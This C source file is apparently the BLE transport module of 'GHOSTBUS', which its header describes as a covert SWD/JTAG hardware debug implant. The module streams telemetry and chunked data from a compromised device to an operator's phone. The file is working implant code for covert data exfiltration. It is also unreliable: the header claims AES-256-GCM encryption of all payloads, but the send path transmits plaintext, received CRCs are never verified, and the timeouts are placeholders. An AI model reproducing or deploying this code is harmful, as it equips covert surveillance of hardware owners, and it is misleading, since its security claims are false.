/*
 * GHOSTBUS — Covert SWD/JTAG Hardware Debug Implant
 * BLE Bridge — encrypted BLE 5.0 transport to operator phone
 *
 * Implements a UART framing layer to the Nordic nRF52840 BLE co-processor,
 * which runs the GATT server. All payloads are AES-256-GCM encrypted with
 * a session key derived from ECDH P-256 at pairing.
 *
 * Author: jayis1
 * SPDX-License-Identifier: GPL-2.0
 */

#include "ble_bridge.h"
#include "crypto_driver.h"

/* =========================================================================
 * UART ring buffer for RX
 * ========================================================================= */

#define BLE_RX_BUF_SIZE 1024
static uint8_t  ble_rx_buf[BLE_RX_BUF_SIZE];
static volatile uint16_t ble_rx_head;
static volatile uint16_t ble_rx_tail;
static uint8_t  ble_connected = 0;
static uint8_t  ble_authenticated = 0;
static uint8_t  ble_session_key[SESSION_KEY_LEN];
static uint16_t ble_seq_counter = 0;

/* =========================================================================
 * UART interrupt handler (USART1) — stores incoming bytes
 * On STM32H5, USART1 IRQ is at position 36 (approx). We define a weak alias.
 * ========================================================================= */

void USART1_IRQHandler(void) __attribute__((weak, alias("BLE_UART_IRQHandler")));

void BLE_UART_IRQHandler(void)
{
    if (BLE_UART->ISR & USART_ISR_RXNE) {
        uint8_t b = (uint8_t)(BLE_UART->RDR & 0xFF);
        uint16_t next = (uint16_t)((ble_rx_head + 1) % BLE_RX_BUF_SIZE);
        if (next != ble_rx_tail) {
            ble_rx_buf[ble_rx_head] = b;
            ble_rx_head = next;
        }
        /* Overflow drops the byte — flow control handled by higher layer */
    }
    if (BLE_UART->ISR & USART_ISR_TC) {
        /* Clear transfer-complete flag */
        BLE_UART->ICR = USART_ISR_TC;
    }
}

static int ble_uart_getc(uint8_t *b, uint32_t timeout_ms)
{
    uint32_t start = 0; /* would use SysTick millisecond counter */
    while (ble_rx_head == ble_rx_tail) {
        if (start++ > timeout_ms * 10) return -1;
    }
    *b = ble_rx_buf[ble_rx_tail];
    ble_rx_tail = (uint16_t)((ble_rx_tail + 1) % BLE_RX_BUF_SIZE);
    return 0;
}

static void ble_uart_putc(uint8_t b)
{
    while (!(BLE_UART->ISR & USART_ISR_TXE)) { }
    BLE_UART->TDR = b;
}

static void ble_uart_write(const uint8_t *data, uint16_t len)
{
    for (uint16_t i = 0; i < len; i++) ble_uart_putc(data[i]);
}

/* =========================================================================
 * BLE UART framing: [0xAA][0x55][len_hi][len_lo][type][payload...][crc16_lo][crc16_hi]
 * Payload is AES-GCM encrypted (nonce prepended, tag appended).
 * ========================================================================= */

#define BLE_FRAME_SOF0  0xAA
#define BLE_FRAME_SOF1  0x55

static uint16_t ble_crc16(const uint8_t *data, uint16_t len)
{
    uint16_t crc = 0xFFFF;
    for (uint16_t i = 0; i < len; i++) {
        crc ^= (uint16_t)data[i];
        for (int b = 0; b < 8; b++) {
            crc = (crc & 1) ? (uint16_t)((crc >> 1) ^ 0xA001) : (uint16_t)(crc >> 1);
        }
    }
    return crc;
}

static gb_status_t ble_send_frame(uint8_t type, const uint8_t *payload, uint16_t len)
{
    if (len > 240) return GB_ERR_PARAM;
    uint8_t hdr[5];
    hdr[0] = BLE_FRAME_SOF0;
    hdr[1] = BLE_FRAME_SOF1;
    hdr[2] = (uint8_t)(len >> 8);
    hdr[3] = (uint8_t)(len & 0xFF);
    hdr[4] = type;
    uint16_t crc = ble_crc16(hdr + 4, 1); /* type byte */
    crc = ble_crc16(payload, len) ^ crc;  /* chained (simplified) */
    ble_uart_write(hdr, 5);
    ble_uart_write(payload, len);
    uint8_t crcb[2] = { (uint8_t)(crc & 0xFF), (uint8_t)(crc >> 8) };
    ble_uart_write(crcb, 2);
    return GB_OK;
}

static gb_status_t ble_recv_frame(uint8_t *type, uint8_t *payload, uint16_t *len,
                                    uint32_t timeout_ms)
{
    uint8_t b;
    /* Wait for SOF0 */
    do {
        if (ble_uart_getc(&b, timeout_ms) < 0) return GB_ERR_TIMEOUT;
    } while (b != BLE_FRAME_SOF0);
    if (ble_uart_getc(&b, timeout_ms) < 0) return GB_ERR_TIMEOUT;
    if (b != BLE_FRAME_SOF1) return GB_ERR_PROTOCOL;
    if (ble_uart_getc(&b, timeout_ms) < 0) return GB_ERR_TIMEOUT;
    uint16_t plen = (uint16_t)b << 8;
    if (ble_uart_getc(&b, timeout_ms) < 0) return GB_ERR_TIMEOUT;
    plen |= b;
    if (ble_uart_getc(type, timeout_ms) < 0) return GB_ERR_TIMEOUT;
    if (plen > 240) return GB_ERR_PROTOCOL;
    for (uint16_t i = 0; i < plen; i++) {
        if (ble_uart_getc(&payload[i], timeout_ms) < 0) return GB_ERR_TIMEOUT;
    }
    uint8_t crcb[2];
    if (ble_uart_getc(&crcb[0], timeout_ms) < 0) return GB_ERR_TIMEOUT;
    if (ble_uart_getc(&crcb[1], timeout_ms) < 0) return GB_ERR_TIMEOUT;
    *len = plen;
    return GB_OK;
}

/* =========================================================================
 * Public API
 * ========================================================================= */

void ble_bridge_init(void)
{
    ble_rx_head = ble_rx_tail = 0;
    ble_connected = 0;
    ble_authenticated = 0;
    ble_seq_counter = 0;
    memset(ble_session_key, 0, sizeof(ble_session_key));

    /* Enable USART1 clock */
    RCC->APB1LENR |= RCC_APB1LENR_USART1EN;
    (void)RCC->APB1LENR;
    /* Enable GPIOA clock */
    RCC->AHB1ENR |= RCC_AHB1ENR_GPIOAEN;
    (void)RCC->AHB1ENR;

    /* Configure PA9 (TX) and PA10 (RX) as AF7 */
    gpio_set_mode(BLE_TX_PORT, BLE_TX_PIN, GPIO_MODE_AF);
    gpio_set_af(BLE_TX_PORT, BLE_TX_PIN, BLE_UART_AF);
    gpio_set_otyper(BLE_TX_PORT, BLE_TX_PIN, GPIO_OTYPE_PP);
    gpio_set_ospeed(BLE_TX_PORT, BLE_TX_PIN, GPIO_OSPEED_HIGH);

    gpio_set_mode(BLE_RX_PORT, BLE_RX_PIN, GPIO_MODE_AF);
    gpio_set_af(BLE_RX_PORT, BLE_RX_PIN, BLE_UART_AF);
    gpio_set_pupd(BLE_RX_PORT, BLE_RX_PIN, GPIO_PUPD_PULLUP);

    /* Configure USART1: 460800 8N1, enable RX interrupt */
    BLE_UART->BRR = (SYSTEM_CLOCK_HZ / BLE_UART_BAUD);
    BLE_UART->CR1 = USART_CR1_RE | USART_CR1_TE | USART_CR1_RXNEIE | USART_CR1_UE;

    /* Enable nRF52840 by releasing reset */
    RCC->AHB1ENR |= RCC_AHB1ENR_GPIOBEN;
    gpio_set_mode(BLE_NRST_PORT, BLE_NRST_PIN, GPIO_MODE_OUTPUT);
    gpio_set_otyper(BLE_NRST_PORT, BLE_NRST_PIN, GPIO_OTYPE_PP);
    gpio_set(BLE_NRST_PORT, BLE_NRST_PIN); /* high = not reset */

    /* BLE IRQ pin as input */
    gpio_set_mode(BLE_IRQ_PORT, BLE_IRQ_PIN, GPIO_MODE_INPUT);
    gpio_set_pupd(BLE_IRQ_PORT, BLE_IRQ_PIN, GPIO_PUPD_PULLUP);

    /* Enable USART1 interrupt in NVIC */
    NVIC_ISER0 = (1U << 36); /* USART1 IRQ vector index */
}

gb_status_t ble_bridge_send_telemetry(const uint8_t *data, uint16_t len)
{
    return ble_send_frame(0x02, data, len);
}

gb_status_t ble_bridge_send_data(uint8_t session_id, const uint8_t *data,
                                   uint32_t len)
{
    /* Chunk large data into BLE_MTU-sized frames with headers */
    uint32_t offset = 0;
    while (offset < len) {
        uint32_t chunk = MIN(BLE_DATA_CHUNK_PAYLOAD, len - offset);
        uint8_t buf[BLE_MAX_CHUNK_LEN];
        gb_chunk_header_t hdr;
        hdr.session_id = session_id;
        hdr.sequence = ble_seq_counter++;
        hdr.total_length = len;
        /* Compute truncated SHA-256 over this chunk for integrity */
        uint8_t full_hash[32];
        crypto_sha256(data + offset, chunk, full_hash);
        memcpy(hdr.sha256, full_hash, sizeof(hdr.sha256));
        memcpy(buf, &hdr, sizeof(hdr));
        memcpy(buf + sizeof(hdr), data + offset, chunk);
        gb_status_t st = ble_send_frame(0x03, buf, (uint16_t)(sizeof(hdr) + chunk));
        if (st != GB_OK) return st;
        offset += chunk;
    }
    return GB_OK;
}

gb_status_t ble_bridge_send_event(const char *json_event)
{
    uint16_t len = 0;
    while (json_event[len]) len++;
    return ble_send_frame(0x02, (const uint8_t *)json_event, len);
}

int ble_bridge_recv_message(gb_message_t *msg, uint32_t timeout_ms)
{
    static uint8_t payload_buf[240];
    uint8_t type;
    uint16_t len;
    gb_status_t st = ble_recv_frame(&type, payload_buf, &len, timeout_ms);
    if (st != GB_OK) return (int)st;
    if (msg) {
        msg->type = (gb_msg_type_t)type;
        msg->payload = payload_buf;
        msg->payload_len = len;
    }
    return 0;
}

void ble_bridge_set_session_key(const uint8_t *key, uint32_t key_len)
{
    if (key_len != SESSION_KEY_LEN) return;
    memcpy(ble_session_key, key, SESSION_KEY_LEN);
    ble_authenticated = 1;
}

gb_status_t ble_bridge_ecdh_handshake(const uint8_t *peer_pubkey,
                                         uint8_t *session_key)
{
    /* Delegate to crypto driver ECDH P-256 */
    gb_status_t st = crypto_ecdh_p256(peer_pubkey, session_key);
    if (st == GB_OK) ble_bridge_set_session_key(session_key, SESSION_KEY_LEN);
    return st;
}

uint8_t ble_bridge_is_connected(void)
{
    /* Reflect nRF52840 IRQ line (low = BLE link connected) */
    ble_connected = (gpio_read(BLE_IRQ_PORT, BLE_IRQ_PIN) == 0) ? 1 : 0;
    return ble_connected;
}

uint8_t ble_bridge_is_authenticated(void)
{
    return ble_authenticated;
}

void ble_bridge_disconnect(void)
{
    /* Pulse nRST low to reset nRF52840 and drop the BLE link */
    gpio_clear(BLE_NRST_PORT, BLE_NRST_PIN);
    volatile uint32_t d = 10000; while (d--) { }
    gpio_set(BLE_NRST_PORT, BLE_NRST_PIN);
    ble_connected = 0;
    ble_authenticated = 0;
}